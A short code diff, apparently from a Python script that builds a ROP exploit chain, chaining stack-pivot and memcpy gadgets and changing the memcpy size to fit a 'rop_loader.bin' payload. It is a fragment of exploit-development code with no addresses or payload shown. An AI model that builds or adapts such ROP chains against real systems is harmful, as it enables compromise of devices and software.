@@ -9,7 +9,7 @@ add_word(PIVOT_2)
 add_word(PIVOT_4)
 add_word(MEMCPY)
 add_word(PIVOT_3)
-add_word(os.path.getsize('build/stmask1.bin')) #memcpy size
+add_word(os.path.getsize('../../../rop/build/rop_loader.bin')+0x24) #memcpy size
 add_word(PIVOT_1)
 
 org(0x8C)
